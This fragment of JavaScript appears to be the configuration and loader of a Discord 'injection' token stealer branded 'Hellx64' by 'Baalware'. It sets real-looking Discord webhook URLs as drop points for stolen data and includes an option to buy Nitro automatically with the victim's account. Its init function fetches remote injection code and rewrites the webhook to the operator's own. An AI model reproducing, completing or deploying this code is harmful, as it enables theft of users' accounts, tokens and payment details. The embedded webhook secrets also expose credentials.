...
const config = {
  webhook: 'https://discord.com/api/webhooks/1104355996580708453/NhE4D96tF-l0-bWyRiO8Ot_2LVTEo7PM1ee9WVRSn7kSvjT9wxfjvp7elvt03c9r5EPA', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'HEELX64 INJECTION',
  embed_icon: 'https://media.discordapp.net/attachments/876603511293509643/1154793947890208980/73bee76f81e253e7f72246e6d37b06e2.png?width=153&height=153'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'blabla', 
  /**
...
async function init() {
    https.get('${config.injection_url}', (res) => {
        ...
        res.replace('https://discord.com/api/webhooks/1153242619971911752/AUMm0xjzaAqAZFIoemdAqS5Oa8_bCQYtftTEgnDM1HyAve0iiUY6EwKzGot7KD-43DbB', '${config.webhook}')
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'Hellx64 Created By Baalware',
        },
      },
    ],
  };
